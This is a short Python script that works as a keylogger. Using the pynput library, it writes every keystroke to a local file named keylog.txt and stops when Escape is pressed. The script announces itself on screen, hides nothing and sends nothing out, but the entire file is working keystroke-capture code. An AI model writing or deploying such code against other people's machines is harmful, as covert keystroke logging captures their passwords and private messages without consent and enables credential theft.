from pynput import keyboard

LOG_FILE = "keylog.txt"

def on_press(key):
    """
    Callback function for key press events.
    Logs the pressed key into a file.
    """
    try:
        # Handle printable keys
        with open(LOG_FILE, "a") as log:
            if hasattr(key, 'char') and key.char is not None:
                log.write(key.char)
            else:
                log.write(f"[{key}]")
    except Exception as e:
        print(f"Error: {e}")

def on_release(key):
    """
    Callback function for key release events.
    Stops the listener when the escape key is pressed.
    """
    if key == keyboard.Key.esc:
        print("Exiting keylogger...")
        return False  # Stop the listener

def main():
    print("Keylogger is running... Press ESC to stop.")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()
